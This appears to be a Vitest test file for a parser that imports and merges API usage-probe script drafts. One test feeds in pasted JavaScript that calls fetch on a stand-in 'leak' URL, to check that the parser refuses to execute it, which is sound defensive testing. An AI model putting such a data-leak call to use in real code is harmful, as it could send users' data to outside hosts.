import { describe, expect, it } from "vitest";
import {
  mergeUsageScriptDraft,
  parseUsageScriptDraft,
} from "@/utils/usageScriptDraft";
import { createUsageScript } from "@/types";

describe("usageScriptDraft", () => {
  it("imports a legacy single object as one usage probe", () => {
    const source = `({
      request: {
        url: "{{baseUrl}}/api/v1/usage",
        method: "GET",
        headers: {
          Authorization: "Bearer {{apiKey}}",
        },
      },
      extractor: function (response) {
        return {
          remaining: response.balance,
          unit: "RMB",
        };
      },
    })`;

    const draft = parseUsageScriptDraft(source);

    expect(draft?.code).toBe(source.trim());
    expect(draft?.probes).toHaveLength(1);
    expect(draft?.probes?.[0]).toMatchObject({
      id: "usage-1",
      type: "usage",
      enabled: true,
      request: {
        url: "{{baseUrl}}/api/v1/usage",
        method: "GET",
        headers: {
          Authorization: "Bearer {{apiKey}}",
        },
      },
    });
    expect(draft?.probes?.[0].extractor).toContain("remaining");
  });

  it("imports a legacy object list and normalizes body values", () => {
    const source = `([
      {
        id: "usage-main",
        type: "usage",
        request: {
          url: "{{baseUrl}}/v1/usage",
          method: "POST",
          headers: {
            Authorization: "Bearer {{apiKey}}",
            "Content-Type": "application/json",
          },
          body: { scope: "month" },
        },
        extractor: function (response) {
          return response;
        },
      },
      {
        id: "rate-main",
        type: "rate",
        request: {
          url: "{{baseUrl}}/v1/usage",
          method: "GET",
        },
        extractor: function (response) {
          const total = response.usage.total;
          const rate = total.cost > 0 ? total.actual_cost / total.cost : 0;
          return { rate, rateLabel: rate.toFixed(4) };
        },
      },
    ])`;

    const draft = parseUsageScriptDraft(source);

    expect(draft?.probes).toHaveLength(2);
    expect(draft?.probes?.[0].request.body).toBe('{"scope":"month"}');
    expect(draft?.probes?.[0].request.headers).toMatchObject({
      Authorization: "Bearer {{apiKey}}",
      "Content-Type": "application/json",
    });
    expect(draft?.probes?.[1]).toMatchObject({
      id: "rate-main",
      type: "rate",
      request: {
        url: "{{baseUrl}}/v1/usage",
        method: "GET",
        headers: {},
      },
    });
    expect(draft?.probes?.[1].extractor).toContain("actual_cost / total.cost");
  });

  it("normalizes full json configs through the same probe path", () => {
    const source = JSON.stringify({
      enabled: true,
      language: "javascript",
      code: "legacy",
      probes: [
        {
          id: "json-rate",
          type: "rate",
          enabled: true,
          request: {
            url: "{{baseUrl}}/v1/usage",
            method: "POST",
            body: { sample: true },
          },
          extractor: "return { rate: 0.06 }",
        },
      ],
    });

    const draft = parseUsageScriptDraft(source);

    expect(draft?.code).toBe(source);
    expect(draft?.probes?.[0]).toMatchObject({
      id: "json-rate",
      type: "rate",
      request: {
        url: "{{baseUrl}}/v1/usage",
        method: "POST",
        headers: {},
        body: '{"sample":true}',
      },
      extractor: "return { rate: 0.06 }",
    });
  });

  it("normalizes invalid json probe fields to safe defaults", () => {
    const source = JSON.stringify({
      probes: [
        {
          id: "bad-type",
          type: "unexpected",
          request: {
            url: "{{baseUrl}}/v1/usage",
          },
        },
      ],
    });

    const draft = parseUsageScriptDraft(source);

    expect(draft?.probes?.[0]).toMatchObject({
      id: "bad-type",
      type: "usage",
      request: {
        url: "{{baseUrl}}/v1/usage",
        method: "GET",
        headers: {},
      },
      extractor: "return response",
    });
  });

  it("does not execute arbitrary pasted JavaScript", () => {
    const source = `(() => {
      fetch("https://example.com/leak");
      return [{ request: { url: "{{baseUrl}}/v1/usage" } }];
    })()`;

    expect(parseUsageScriptDraft(source)).toBeNull();
  });

  it("leaves ordinary legacy code for the original formatter path", () => {
    const source = `({
      helper: true,
      extractor: function () {
        return {};
      },
    })`;

    expect(parseUsageScriptDraft(source)).toBeNull();
  });

  it("merges imported probes while preserving existing credentials", () => {
    const current = createUsageScript({
      enabled: true,
      code: "old",
      apiKey: "existing-key",
      baseUrl: "https://www.findcg.com",
    });
    const draft = parseUsageScriptDraft(`([
      {
        type: "rate",
        request: { url: "{{baseUrl}}/v1/usage", method: "GET" },
        extractor: function (response) {
          return { rate: 1 };
        },
      },
    ])`);

    const merged = mergeUsageScriptDraft(current, draft!);

    expect(merged.apiKey).toBe("existing-key");
    expect(merged.baseUrl).toBe("https://www.findcg.com");
    expect(merged.code).toContain("type: \"rate\"");
    expect(merged.probes).toHaveLength(1);
  });
});
